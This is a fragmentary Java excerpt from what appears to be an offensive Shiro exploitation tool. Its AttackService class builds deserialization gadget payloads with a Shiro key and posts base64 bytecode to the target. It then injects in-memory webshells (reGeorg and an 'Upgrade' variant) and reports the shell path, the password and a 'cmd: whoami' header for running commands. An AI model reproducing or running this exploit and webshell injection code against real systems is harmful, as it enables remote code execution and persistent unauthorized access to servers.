...
public class AttackService {
    ...
    public String headerHttpRequest(HashMap<String, String> header) throws InterruptedException {
        String result = null;
...
//                header.put("Host", "08fb41620aa4c498a1f2ef09bbc1183c");
    ...
    public String GadgetPayload(String gadgetOpt, String echoOpt, String spcShiroKey,String payloadskey) {
        ...
        try {
            ...
            Object template = Gadgets.createTemplatesImpl(echoOpt,payloadskey);
...
//                }
    ...
    public void injectMem(String memShellType, String shellPass, String shellPath,String payloadskey) {
        String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey, payloadskey);
        if (injectRememberMe != null) {
            ...
            try {
                ...
                String postString = payloadskey + "=" + b64Bytecode;
//                String postString = "user=" + b64Bytecode;
                ...
                if (result.contains("->|Success|<-")) {
                    ...
                    if (!memShellType.equals("UpgradeMemshell")) {
                        this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
                    }
                    if (!memShellType.equals("reGeorg[Servlet]")&&!memShellType.equals("UpgradeMemshell")) {
                        this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
                    }
                    if(memShellType.equals("UpgradeMemshell")){
                        this.mainController.InjOutputArea.appendText(Utils.log("add header：\n" + " * Upgrade: alter\n" +
                                " * Connection: Upgrade\n" +
                                " * cmd: whoami"));
                    }
                } else {
                    if (result.contains("->|") && result.contains("|<-")) {
                        ...
                        while(matcher.find()){
                            this.mainController.InjOutputArea.appendText(Utils.log(matcher.group(2)));
                        }
